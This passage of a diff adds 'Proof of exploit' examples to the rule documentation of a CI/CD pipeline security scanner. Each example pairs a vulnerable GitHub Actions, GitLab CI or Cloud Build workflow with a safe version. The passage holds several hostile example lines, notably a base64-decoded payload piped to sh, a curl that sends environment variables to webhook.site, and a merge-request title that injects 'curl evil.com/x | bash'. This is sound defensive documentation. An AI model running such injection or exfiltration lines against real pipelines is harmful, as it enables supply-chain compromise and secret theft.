+serviceAccount: projects/myproj/serviceAccounts/cd-app@myproj.iam.gserviceaccount.com
+steps:
+  - name: gcr.io/cloud-builders/gcloud@sha256:abc123...
+    args: [deploy]
+```
 
 **Source:** [`GCB-020`](../providers/cloudbuild.md#gcb-020) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -5146,6 +8394,36 @@ steps:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``docker run --privileged`` plus the host
+# Docker socket runs inside a GitHub-hosted (or self-
+# hosted) runner. The container escapes to the runner;
+# on self-hosted runners that's persistent compromise.
+name: integration
+on: [push]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: |
+          docker run --privileged \
+            -v /var/run/docker.sock:/var/run/docker.sock \
+            myapp:test ./integration.sh
+
+# Safe: drop ``--privileged`` and the socket mount. Use
+# a rootless builder (Kaniko, BuildKit rootless) if the
+# job needs to build images. Pin the image to a digest.
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: docker run myapp@sha256:abc123... ./integration.sh
+```
+
 **Source:** [`GHA-017`](../providers/github.md#gha-017) in the [GitHub Actions provider](../providers/github.md).
 
 ### `GHA-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-018 }
@@ -5397,6 +8675,35 @@ jobs:
 
 **Recommendation.** Remove ``--network host``, ``--privileged``, ``--cap-add``, ``--user 0``/``--user root``, ``--pid host``, ``--ipc host``, and host ``-v`` bind-mounts from ``container.options`` and ``services.*.options``. If a build genuinely needs one of these, move it to a dedicated self-hosted pool with branch protection so the flag doesn't reach PR runs.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``container.options`` adds ``--privileged``
+# or ``--cap-add=SYS_ADMIN``. The container job runs
+# inside the runner with elevated kernel access; a build
+# RCE escapes the container boundary.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    container:
+      image: alpine@sha256:abc123...
+      options: --privileged --cap-add=SYS_ADMIN -v /var/run/docker.sock:/var/run/docker.sock
+    steps:
+      - run: ./build.sh
+
+# Safe: no ``options:`` override of the default isolation.
+# Drop privileged-mode and the socket mount entirely; the
+# container runs with default capabilities and a clean
+# kernel-namespace boundary against the runner.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    container:
+      image: alpine@sha256:abc123...
+    steps:
+      - run: ./build.sh
+```
+
 **Source:** [`GHA-026`](../providers/github.md#gha-026) in the [GitHub Actions provider](../providers/github.md).
 
 ### `GHA-027`: Workflow contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-027 }
@@ -5411,6 +8718,34 @@ jobs:
 
 - Security-training repositories, CTF challenges, and red-team exercise workflows legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production workflow still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a step body executes a base64-decoded
+# payload, exfils to ``webhook.site``, or runs a known
+# miner binary. A malicious PR (or compromised co-
+# maintainer) lands the payload in a workflow file;
+# every subsequent run executes it.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo Z2g6Li4uIA== | base64 -d | sh
+          curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the workflow does only what the workflow does.
+# No obfuscated execution, no exfil POSTs, no
+# ``base64 -d | sh`` pipelines. If a check fires it's a
+# compromise or a CTF fixture; treat as incident response.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: make build
+```
 
 **Source:** [`GHA-027`](../providers/github.md#gha-027) in the [GitHub Actions provider](../providers/github.md).
 
@@ -5474,6 +8809,44 @@ jobs:
 
 **Recommendation.** Bind every job that exchanges the GHA OIDC token for cloud credentials to a protected ``environment:`` (e.g. ``environment: production``). Environment protections layer in branch restrictions, required reviewers, and deployment windows that the IdP-side trust policy cannot enforce alone.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a job requests an OIDC token (``id-token:
+# write``) without an ``environment:`` binding. The token
+# can be minted from any branch or any PR trigger; if the
+# AWS / GCP / Azure trust policy permits any subject from
+# the repo, a fork-PR build assumes prod.
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - uses: aws-actions/configure-aws-credentials@<sha>
+        with:
+          role-to-assume: arn:aws:iam::123:role/prod-deploy
+          aws-region: us-east-1
+
+# Safe: bind the job to a protected environment that
+# requires reviewer approval. The OIDC token is only
+# mintable after the human gate fires AND the cloud-side
+# trust policy pins ``sub`` to the protected environment.
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment: production   # required-reviewers gate
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - uses: aws-actions/configure-aws-credentials@<sha>
+        with:
+          role-to-assume: arn:aws:iam::123:role/prod-deploy
+          aws-region: us-east-1
+```
+
 **Source:** [`GHA-030`](../providers/github.md#gha-030) in the [GitHub Actions provider](../providers/github.md).
 
 ### `GHA-031`: Workflow uses retired set-output / save-state command <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-031 }
@@ -5483,6 +8856,36 @@ jobs:
 **How this is detected.** GitHub deprecated ``::set-output::`` and ``::save-state::`` in October 2022 because they read from the runner's stdout as a control channel. Any tool whose output happens to contain ``::set-output…`` (a CI job's own diagnostic, a downloaded log, an upstream test framework) silently sets a step output. The replacement workflow commands (``$GITHUB_OUTPUT`` / ``$GITHUB_STATE`` files) close that injection channel. Workflows still using the retired commands also depend on a deprecation timer that GitHub has extended several times. They will eventually break.
 
 **Recommendation.** Replace ``echo "::set-output name=X::$VALUE"`` with ``echo "X=$VALUE" >> "$GITHUB_OUTPUT"`` and ``echo "::save-state name=X::$VALUE"`` with ``echo "X=$VALUE" >> "$GITHUB_STATE"``. The old commands stream through the runner's stdout, which lets any log line that happens to start with ``::`` inject into the command channel. The file-redirect forms write to a private file the runner reads after the step exits, no log-line interleaving, no injection.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``echo "::set-output name=..."`` (and
+# ``::save-state``) are retired GitHub-Actions workflow
+# commands. GitHub disabled them due to a command-
+# injection class where an attacker-controlled string
+# carrying ``%0A::set-output name=secret::pwned`` (or
+# similar) injects fake workflow commands into the
+# runner. The retired commands also stopped being
+# supported, so this step silently no-ops at runtime.
+jobs:
+  extract:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "::set-output name=tag::$VERSION"
+        id: x
+
+# Safe: use the file-based replacements (``$GITHUB_OUTPUT``
+# and ``$GITHUB_STATE``). The new format isn't parsed by
+# the runner from stdout, so command-injection through a
+# variable value isn't possible.
+jobs:
+  extract:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "tag=$VERSION" >> "$GITHUB_OUTPUT"
+        id: x
+```
 
 **Source:** [`GHA-031`](../providers/github.md#gha-031) in the [GitHub Actions provider](../providers/github.md).
 
@@ -5497,6 +8900,48 @@ jobs:
 **Known false positives.**
 
 - Workflows that explicitly checkout a *trusted* ref (``ref: ${{ github.event.pull_request.base.sha }}`` or the default branch) before invoking the local script land the trusted bytes on disk, so the script body the PR ships is never executed. The rule has no checkout-graph analysis, it fires on any ``run: ./script`` under an untrusted trigger. Suppress per-workflow via ``--ignore-file`` once you've verified the checkout ref is anchored to a base-branch SHA; the safer pattern is still to split the workflow so secrets aren't in scope during the build half.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: an untrusted-trigger workflow
+# (``pull_request_target`` / ``workflow_run``) ``run``s
+# a local script. The PR head is checked out into the
+# workspace; the script the workflow invokes was
+# rewritten by the attacker's PR. The privileged trigger
+# then executes the PR-controlled script with secrets.
+name: comment-lint
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: ./scripts/lint.sh   # attacker rewrote scripts/lint.sh in the PR
+
+# Safe: don't run local scripts under untrusted triggers.
+# Move the privileged work to a separate workflow gated
+# on ``workflow_dispatch`` (with environment approval) or
+# scope ``pull_request_target`` to non-script comment
+# operations only.
+name: comment-lint
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@<sha>
+        with:
+          script: |
+            // Read-only PR metadata; no checkout of PR head.
+            github.rest.issues.createComment({ ... })
+```
 
 **Source:** [`GHA-032`](../providers/github.md#gha-032) in the [GitHub Actions provider](../providers/github.md).
 
@@ -5513,6 +8958,42 @@ jobs:
 Out of scope (deliberate carve-out): inline secret references in a command's *arguments* without shell trace enabled. ``curl --header "Authorization: Bearer ${{ secrets.X }}"`` doesn't echo the header to stdout — the value goes to the network, not the log. That class of leak is covered by GHA-008 (literal credential in YAML) and the network-egress shape of GHA-057, not GHA-033. ``greylag-ci/cicd-goat`` scenario 15 sits squarely in this carve-out: a literal hex token in workflow ``env:`` plus a GET ``curl`` carrying the credential in an ``Authorization:`` header. GHA-008 fires on the literal; GHA-033 deliberately does not.
 
 **Recommendation.** Don't print secret values from a script. GitHub's log redaction is a best-effort string match. It doesn't catch base64 / urlencoded / partial substrings, and any caller that retrieves the raw log via the API gets the unredacted stream. If you need to confirm the secret exists, log a boolean (``[ -n "$X" ] && echo set || echo unset``) or a fingerprint (``echo "$X" | sha256sum | head -c8``), never the value itself.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``echo $TOKEN`` (or printing a
+# ``${{ secrets.X }}`` interpolation) prints the masked
+# value to stdout. GitHub masks ``$TOKEN`` with ``***``
+# in the log, but ``set -x`` (or any shell-trace mode)
+# dumps the literal value because trace output isn't
+# subject to the mask. Same applies to ``cat`` / ``tee``
+# of any file the secret was written into.
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.DEPLOY_KEY }}
+    steps:
+      - run: |
+          set -x
+          curl -H "Authorization: Bearer $TOKEN" \
+            https://api.example.com/deploy
+
+# Safe: don't echo the secret. Drop ``set -x`` (or ensure
+# it's set only when no secret env vars are in scope).
+# Pass the secret to curl via a stdin / config file so it
+# never lands in shell trace output.
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.DEPLOY_KEY }}
+    steps:
+      - run: |
+          curl --config <(echo "header = \"Authorization: Bearer $TOKEN\"") \
+            https://api.example.com/deploy
+```
 
 **Source:** [`GHA-033`](../providers/github.md#gha-033) in the [GitHub Actions provider](../providers/github.md).
 
@@ -5642,6 +9123,47 @@ Sister rule: GHA-019 catches the explicit ``echo $GITHUB_TOKEN > file`` shape; G
 
 - Workflows that genuinely need ``persist-credentials: true`` to push back to the repo (a release-tag bot, a docs-deploy job, ``stefanzweifel/git-auto-commit-action``) shouldn't suppress this rule globally; instead, scope ``persist-credentials: true`` to a named step, then run the push immediately, then use a fresh ``actions/checkout`` with ``persist-credentials: false`` so the token doesn't leak into later steps. Suppress on the specific step name only when the scoped pattern is in place.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``actions/checkout`` with
+# ``persist-credentials: true`` (the default) writes the
+# runtime ``GITHUB_TOKEN`` into ``.git/config`` as an
+# ``http.<host>/.extraheader``. Any subsequent step that
+# reads ``.git/config`` (an artifact upload of the repo
+# root, a ``cat .git/config`` for debugging) exposes the
+# token. The ArtiPACKED attack chain rides exactly this.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+        # default persist-credentials: true
+      - run: ./build.sh
+      - uses: actions/upload-artifact@<sha>
+        with:
+          name: build
+          path: .   # uploads .git/config with token
+
+# Safe: set ``persist-credentials: false`` so the token
+# only lives in the checkout's request, not in the
+# on-disk config. Subsequent steps that need to push use
+# an explicit credential (and only on the step that needs
+# it).
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+        with:
+          persist-credentials: false
+      - run: ./build.sh
+      - uses: actions/upload-artifact@<sha>
+        with:
+          name: build
+          path: dist/   # not the repo root
+```
+
 **Source:** [`GHA-037`](../providers/github.md#gha-037) in the [GitHub Actions provider](../providers/github.md).
 
 ### `GHA-038`: Workflow re-enables retired ::set-env / ::add-path commands <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-038 }
@@ -5705,6 +9227,40 @@ GHA-008 scans the workflow for credential **patterns** (AWS access keys, JWTs, S
 **Known false positives.**
 
 - Workflows that legitimately use a public anonymous registry mirror occasionally hardcode ``username: anonymous`` / ``password: ""`` for clarity. Both shapes are filtered out automatically (empty / whitespace-only values, plus the literal ``anonymous`` username), but if your fixture uses another sentinel for anonymous access, suppress the specific job/service in the ignore-file rather than the rule globally.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: literal username/password embedded in a
+# ``container.credentials`` block (or in a service's
+# credentials). The workflow file is committed to git
+# and visible to every repo reader; the build log also
+# carries the literal once the runner pulls the image.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    container:
+      image: registry.example.com/myorg/build@sha256:abc123...
+      credentials:
+        username: build-bot
+        password: hunter2-prod-registry-token
+    steps:
+      - run: make build
+
+# Safe: reference a repo / org secret. The actual value
+# resolves at runtime, is masked in logs, and rotates in
+# the secrets store without a workflow change.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    container:
+      image: registry.example.com/myorg/build@sha256:abc123...
+      credentials:
+        username: ${{ secrets.REGISTRY_USERNAME }}
+        password: ${{ secrets.REGISTRY_PASSWORD }}
+    steps:
+      - run: make build
+```
 
 **Source:** [`GHA-039`](../providers/github.md#gha-039) in the [GitHub Actions provider](../providers/github.md).
 
@@ -5805,6 +9361,39 @@ GHA-008 scans the workflow for credential **patterns** (AWS access keys, JWTs, S
 **Seen in the wild.**
 
 - GitGuardian 2023 supply-chain audit: a handful of low-popularity actions with ``contents: write`` were weaponized via single-PR maintainer-impersonation compromises; the elevated permission was the privilege amplifier that let the attacker push code back to the victim's default branch on the same workflow run.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``uses: rando-user/single-maintainer-action``
+# is a low-star action from a single-maintainer repo,
+# AND the calling job grants ``contents: write`` /
+# ``id-token: write`` / similar. A compromised maintainer
+# (or a typosquat / namespace takeover) ships code into
+# the runner with write access to the repo.
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      id-token: write
+    steps:
+      - uses: rando-user/auto-release@<sha>   # 4 stars, 1 maintainer
+
+# Safe: vet the action's reputation before granting
+# sensitive permissions. Prefer first-party / verified-
+# creator actions for privileged jobs. If a niche action
+# is truly required, fork it into your own org, vendor
+# the maintained version, and pin to your fork's SHA.
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      id-token: write
+    steps:
+      - uses: softprops/action-gh-release@<sha>   # verified-creator equivalent
+```
 
 **Source:** [`GHA-043`](../providers/github.md#gha-043) in the [GitHub Actions provider](../providers/github.md).
 
@@ -6216,6 +9805,42 @@ The attack is cache poisoning: an attacker opens a PR whose branch name (``head_
 
 - Some workflows legitimately scope cache keys per feature branch by including ``github.head_ref`` in a ``pull_request`` workflow where the cache is segmented by ref (so cross-branch poisoning is impossible). The right pattern is to prefix the key with a non-attacker-controllable namespace AND rely on ``restore-keys`` only for read-fallback. Suppress on the specific step with a rationale that documents the namespacing.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``actions/cache`` keys on a PR-controllable
+# value (``github.event.pull_request.title`` /
+# ``github.head_ref`` / similar). A fork PR sets the
+# title (or branch name) to match a key that a trusted-
+# context build writes; the trusted build reads the PR's
+# poisoned cache and ingests attacker-controlled bytes.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - uses: actions/cache@<sha>
+        with:
+          path: ~/.npm
+          key: npm-${{ github.head_ref }}   # PR-controllable
+      - run: npm ci
+
+# Safe: key on commit-stable inputs only — a hash of the
+# lockfile is unique enough and not attacker-controllable
+# across PR boundaries. Fork PR caches are namespaced
+# separately and never read by trusted-context builds.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - uses: actions/cache@<sha>
+        with:
+          path: ~/.npm
+          key: npm-${{ hashFiles('package-lock.json') }}
+      - run: npm ci
+```
+
 **Source:** [`GHA-052`](../providers/github.md#gha-052) in the [GitHub Actions provider](../providers/github.md).
 
 ### `GHA-053`: if: predicate evaluates attacker-controllable context as expression <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-053 }
@@ -6235,6 +9860,45 @@ Documented attack: a PR title of ``${{ secrets.X }}`` inside an ``if: contains(g
 **Known false positives.**
 
 - A workflow that legitimately gates on the existence of certain text in the commit message (release automation) and is invoked only via ``workflow_dispatch`` from a trusted actor isn't exposed to the attack. The right pattern is still to route through a step output for clarity; suppress on the specific job/step when the trigger channel itself enforces the trust boundary.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``if: ${{ contains(github.event.issue.title,
+# 'deploy') }}`` evaluates an attacker-controllable string
+# in the expression language. The expression engine
+# parses certain inputs (``${{ ... }}`` nested) before
+# the contains() check, so a crafted title can corrupt
+# the predicate's evaluation.
+on:
+  issue_comment:
+    types: [created]
+jobs:
+  ondemand-deploy:
+    if: ${{ contains(github.event.comment.body, '/deploy') }}
+    runs-on: ubuntu-latest
+    permissions: { contents: write }
+    steps:
+      - run: ./deploy.sh
+
+# Safe: route the untrusted value through an intermediate
+# step that pulls the value into an env var, then evaluate
+# the predicate against a guaranteed-safe shape (issue
+# author is a maintainer, label exists, etc.) computed
+# from authenticated sources.
+on:
+  issue_comment:
+    types: [created]
+jobs:
+  ondemand-deploy:
+    if: |
+      github.event.comment.author_association == 'OWNER' &&
+      startsWith(github.event.comment.body, '/deploy')
+    runs-on: ubuntu-latest
+    permissions: { contents: write }
+    steps:
+      - run: ./deploy.sh
+```
 
 **Source:** [`GHA-053`](../providers/github.md#gha-053) in the [GitHub Actions provider](../providers/github.md).
 
@@ -6257,6 +9921,46 @@ The safe pattern: ``actions/checkout@<sha>`` with ``ssh-key: ${{ secrets.DEPLOY_
 
 - Workflows that genuinely need the SSH key to remain available in the repo (a single-job pipeline that clones, builds, and pushes back to the same repo using the same key) sometimes set ``persist-credentials: true`` deliberately. The safer pattern is to split the push into a separate job whose ``actions/checkout`` re-clones with the same key but without persist; or use a fine-grained PAT for the push step. Suppress with a rationale that names the single-job constraint.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``actions/checkout`` with ``ssh-key:`` and
+# ``persist-credentials: true`` writes the deploy SSH
+# private key into ``.git/config`` (or the ssh-agent
+# session) for the workflow's duration. A later step that
+# uploads the workspace as an artifact leaks the key the
+# same way ArtiPACKED leaks the GITHUB_TOKEN.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+        with:
+          ssh-key: ${{ secrets.DEPLOY_KEY }}
+          # default persist-credentials: true
+      - run: ./build.sh
+      - uses: actions/upload-artifact@<sha>
+        with:
+          name: build
+          path: .   # uploads .git/config + ssh setup
+
+# Safe: set ``persist-credentials: false`` and scope the
+# artifact upload to ``dist/`` (not the repo root).
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+        with:
+          ssh-key: ${{ secrets.DEPLOY_KEY }}
+          persist-credentials: false
+      - run: ./build.sh
+      - uses: actions/upload-artifact@<sha>
+        with:
+          name: build
+          path: dist/
+```
+
 **Source:** [`GHA-054`](../providers/github.md#gha-054) in the [GitHub Actions provider](../providers/github.md).
 
 ### `GHA-055`: Reusable workflow outputs derive a secret or caller-input value <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-055 }
@@ -6274,6 +9978,44 @@ If the caller genuinely needs information derived from a secret (e.g., a build a
 **Known false positives.**
 
 - A reusable workflow that emits a *hash* of a secret (``sha256(secret)``) as an output is not the same risk shape — the original secret is not recoverable. The rule errs on the side of flagging any direct ``${{ secrets.* }}`` / ``${{ inputs.* }}`` substring in the output value; suppress when the value is provably a one-way transform.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a reusable workflow exposes a secret (or a
+# caller-input value) via ``outputs:``. Outputs from a
+# reusable workflow flow back to the caller's workflow
+# in plain text; the secret leaks even though the
+# reusable workflow itself runs in a sandboxed context.
+# .github/workflows/reusable.yml
+on:
+  workflow_call:
+    secrets:
+      api_token:
+        required: true
+    outputs:
+      effective-token:
+        description: "token used"
+        value: ${{ secrets.api_token }}
+jobs:
+  fetch:
+    runs-on: ubuntu-latest
+    steps: [{ run: curl --header "Authorization: Bearer ${{ secrets.api_token }}" ... }]
+
+# Safe: don't surface secrets through reusable-workflow
+# outputs. Outputs should carry computed non-secret
+# values (a release tag, a status flag, the digest of an
+# uploaded artifact) the caller might key off.
+# .github/workflows/reusable.yml
+on:
+  workflow_call:
+    secrets:
+      api_token: { required: true }
+    outputs:
+      release-tag:
+        description: "tag produced"
+        value: ${{ jobs.fetch.outputs.tag }}
+```
 
 **Source:** [`GHA-055`](../providers/github.md#gha-055) in the [GitHub Actions provider](../providers/github.md).
 
@@ -6621,6 +10363,27 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``image: node:20`` is a mutable tag. Docker
+# Hub's node team rebuilds it on every Node point
+# release; a publisher takeover ships code into every
+# GitLab pipeline using the tag.
+build:
+  image: node:20
+  script:
+    - npm ci
+    - npm test
+
+# Safe: pin to the content-addressable digest.
+build:
+  image: node@sha256:abc123...   # node:20.11.1
+  script:
+    - npm ci
+    - npm test
+```
+
 **Source:** [`GL-001`](../providers/gitlab.md#gl-001) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-002`: Script injection via untrusted commit/MR context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-002 }
@@ -6631,6 +10394,31 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 
 **Recommendation.** Read these values into intermediate `variables:` entries or shell variables and quote them defensively (`"$BRANCH"`). Never inline `$CI_COMMIT_MESSAGE` / `$CI_MERGE_REQUEST_TITLE` into a shell command.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: an MR titled ``feat: shiny new thing";
+# curl evil.com/x | bash;"`` executes the curl in the
+# build's shell context. The MR author needs no special
+# privilege — any branch contributor can open one.
+build:
+  script:
+    - echo "Building MR $CI_MERGE_REQUEST_TITLE"
+    - ./build.sh
+
+# Safe: pass the untrusted value through an env var and
+# quote it. The shell sees the value as one argument; the
+# attacker's injected ``;`` / ``$()`` / backticks are
+# literal characters in the printed string, not parsed
+# tokens.
+build:
+  script:
+    - echo "Building MR $MR_TITLE"
+    - ./build.sh
+  variables:
+    MR_TITLE: $CI_MERGE_REQUEST_TITLE
+```
+
 **Source:** [`GL-002`](../providers/gitlab.md#gl-002) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gl-003 }
@@ -6640,6 +10428,29 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 **How this is detected.** Scans `variables:` at the top level and on each job for entries whose KEY looks credential-shaped and whose VALUE is a literal string (not a `$VAR` reference). AWS access keys are detected by value pattern regardless of key name.
 
 **Recommendation.** Store credentials as protected + masked CI/CD variables in project or group settings, and reference them by name from the YAML. For cloud access prefer short-lived OIDC tokens.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: literal AWS access key in pipeline-level
+# ``variables:``. The ``.gitlab-ci.yml`` is committed
+# to git, printed in build logs whenever a job echoes
+# its environment, visible to any repo reader.
+variables:
+  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+deploy:
+  script: [aws s3 cp ./build s3://bucket/]
+
+# Safe: store credentials as protected + masked CI/CD
+# variables in GitLab Settings. The pipeline file
+# references the env names; values resolve at runtime
+# and are masked in logs.
+deploy:
+  script: [aws s3 cp ./build s3://bucket/]
+  # AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY come from
+  # project-level protected + masked CI/CD variables
+```
 
 **Source:** [`GL-003`](../providers/gitlab.md#gl-003) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -6660,6 +10471,29 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 **How this is detected.** Cross-project and remote includes can be silently re-pointed. Branch-name refs (`main`/`master`/`develop`/`head`) are treated as unpinned; tag and SHA refs are considered safe.
 
 **Recommendation.** Pin `include: project:` entries with `ref:` set to a tag or commit SHA. Avoid `include: remote:` for untrusted URLs; mirror the content into a trusted project and pin it.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``include:`` pulls a remote project without
+# a pinned ref. ``ref:`` defaults to ``HEAD`` of the
+# default branch; whoever can push to that branch on
+# the templates project ships pipeline code into every
+# consumer.
+include:
+  - project: 'ci/templates'
+    file: '/build.yml'
+    # no ref: — resolves to HEAD
+
+# Safe: pin ``ref:`` to a tag (with tag-protect enforced
+# on the templates project) or a 40-char commit SHA.
+# Renovate's gitlabci-include ecosystem updater bumps
+# these in reviewable MRs.
+include:
+  - project: 'ci/templates'
+    file: '/build.yml'
+    ref: 0123456789abcdef0123456789abcdef01234567   # v1.4.2
+```
 
 **Source:** [`GL-005`](../providers/gitlab.md#gl-005) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -6697,6 +10531,28 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 
 - Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a credential-shaped literal in a job env
+# / inline script / variables block. Same leak surface
+# as GL-003 plus the additional gap that build-time
+# logs may echo the value.
+deploy:
+  script:
+    - curl -H "Authorization: Bearer ghp_abcdef1234567890abcdef1234567890abcdef12" \
+        https://api.github.com/repos/org/repo/issues
+
+# Safe: route the credential through a protected +
+# masked CI/CD variable. The pipeline body carries the
+# env name, never the value.
+deploy:
+  script:
+    - curl -H "Authorization: Bearer $GITHUB_TOKEN" \
+        https://api.github.com/repos/org/repo/issues
+  # GITHUB_TOKEN configured as protected + masked
+```
+
 **Source:** [`GL-008`](../providers/gitlab.md#gl-008) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-009`: Image pinned to version tag rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-gl-009 }
@@ -6717,6 +10573,45 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 
 **Recommendation.** Add a verification step before consuming the artifact: `cosign verify-attestation`, `sha256sum -c`, or `gpg --verify` against a manifest signed by the upstream project's release key. Only consume artifacts produced by upstream pipelines whose origin you can trust.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: every run of ``deploy`` downloads the binary
+# from ``vendor-team/build``'s latest pipeline and executes
+# it. If that upstream project accepts MR pipelines, an MR
+# author can push a malicious binary as ``build-output``
+# and have it run inside ``deploy`` with the deploy job's
+# credentials.
+deploy:
+  stage: deploy
+  needs:
+    - project: vendor-team/build
+      job: package
+      ref: main
+      artifacts: true
+  script:
+    - ./build-output/release    # runs the upstream binary
+
+# Safe: verify a signed manifest (cosign / GPG / SHA-256
+# from a trusted publisher) before executing anything from
+# the downloaded directory. The verify step must come BEFORE
+# any step that reads the artifact.
+deploy:
+  stage: deploy
+  needs:
+    - project: vendor-team/build
+      job: package
+      ref: main
+      artifacts: true
+  script:
+    - cosign verify-attestation
+        --type slsaprovenance
+        --certificate-identity-regexp 'https://gitlab.com/vendor-team/build/'
+        --certificate-oidc-issuer 'https://gitlab.com'
+        ./build-output/release
+    - ./build-output/release
+```
+
 **Source:** [`GL-010`](../providers/gitlab.md#gl-010) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-011`: include: local file pulled in MR-triggered pipeline <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-011 }
@@ -6726,6 +10621,31 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 **How this is detected.** `include: local: '<path>'` resolves from the current pipeline's checked-out tree. On an MR pipeline the tree is the MR source branch, the MR author controls the included YAML content.
 
 **Recommendation.** Move the included template into a separate, read-only project and reference it via `include: project: ... ref: <sha-or-tag>`. That way the included content is fixed at MR creation time and not editable from the MR branch.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the pipeline ``include:``s a local file
+# that any MR can modify, on an MR-triggered pipeline.
+# A merge request can rewrite ``ci/build.yml`` and
+# run its own version of the build with the pipeline's
+# full credential set in scope.
+include:
+  - local: 'ci/build.yml'
+build:
+  extends: .build_steps
+  rules:
+    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'
+
+# Safe: route MR-triggered work through a separate
